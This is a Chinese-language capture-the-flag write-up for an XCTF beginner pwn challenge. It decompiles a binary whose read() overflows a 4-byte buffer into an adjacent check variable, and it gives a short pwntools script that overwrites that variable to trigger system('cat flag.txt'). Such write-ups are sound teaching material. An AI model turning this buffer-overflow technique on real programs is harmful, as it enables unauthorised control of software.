#### [ad0465 覆盖变量值](https://adworld.xctf.org.cn/media/file/task/4f2f44c9471d4dc2b59768779e378282)
1. 分析过程  
    查看main函数，查看里面的hello()可疑函数：
    ```c
    __int64 __fastcall main(int a1, char **a2, char **a3)
    {
        alarm(0x3Cu);
        setbuf(stdout, 0LL);
        puts("~~ welcome to ctf ~~     ");
        puts("lets get helloworld for bof");
        read(0, &unk_601068, 0x10uLL);     // 注入点
        if ( dword_60106C == 1853186401 )  // 后门
            sub_400686();
        return 0LL;
    }
    ```
    查看输入点，输入到unk_601068；查看函数sub_400686()，为cat flag
    ```c
    read(0, &unk_601068, 0x10uLL);
    if ( dword_60106C == 1853186401 )
        sub_400686();
    ```
    ```c
    __int64 sub_400686()
    {
        system("cat flag.txt");
        return 0LL;
    }
    ```
    检查对应栈地址，发现dword_60106C就在unk_601068下面，并且unk_601068只占4字节，而read函数读入0x10字节，可以覆盖到dword_60106C
    ```
    .bss:0000000000601068 unk_601068      db    ? ;               ; DATA XREF: main+3B↑o
    .bss:0000000000601069                 db    ? ;
    .bss:000000000060106A                 db    ? ;
    .bss:000000000060106B                 db    ? ;
    .bss:000000000060106C dword_60106C    dd ?                    ; DATA XREF: main+4A↑r
    ```
2. exp.py
    ```python
    from pwn import *
    io = process('./pwn')
    val = p64(1853186401)           # 64位的程序，需要注入的数字（使dword_60106C=1853186401）
    payload = b'a'*4 + val         # 4位填充到unk_601068，溢出为val
    io.sendline(payload)
    io.interactive()
    ```
